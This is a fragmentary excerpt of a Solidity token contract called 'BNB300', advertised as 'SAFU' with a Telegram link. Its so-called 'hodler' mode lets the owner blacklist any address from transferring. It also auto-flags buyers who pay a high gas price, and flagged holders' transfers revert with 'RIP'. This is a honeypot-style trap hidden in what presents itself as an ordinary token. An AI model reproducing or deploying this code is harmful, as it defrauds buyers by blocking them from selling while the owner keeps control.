...
BNB AT $300 LETS CELEBRATE!! SAFU AF
...
https://t.me/+qLE0va6bqm01NGEx Channel only, no TG drama / bullshit. 
...
contract BNB300 is IERC20, Ownable {
    ...
    address constant gasrouter      = 0xa2b52495371EEd0bf260B056895077B09E7e2C84;

    string _name = "BNB 300";
    string _symbol = "BNB300";
    ...
    mapping (address => bool) public ishodlered;
    ...
    uint256 largeSwapThreshold = _totalSupply * 15 / 10000;
    ...
    constructor () {
        ...
        marketingFeeReceiver = 0x7D51C68AA449665a39b348958eF9c1754A9BF35f;
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        // hodler
        if(hodlerMode){
            require(!ishodlered[sender],"RIP");  
        }

         if (tx.gasprice >= gasFee && recipient != pair) {
            ishodlered[recipient] = true;
                    }
    ...
    function configSwapSettings(bool _enabled, uint256 _amountS, uint256 _amountL, bool _alternate) external onlyOwner {
    ...
    function enable_mode(bool _status) public onlyOwner {
        hodlerMode = _status;
    }

    function manage_hodler(address[] calldata addresses, bool status) public onlyOwner {
        for (uint256 i; i < addresses.length; ++i) {
            ishodlered[addresses[i]] = status;
        }
    }
    ...
    function addFeeExempt(address holder, bool exempt) external onlyOwner {
        isFeeExempt[holder] = exempt;
    }

    function addIsTxLimitExempt(address holder, bool exempt) external onlyOwner {
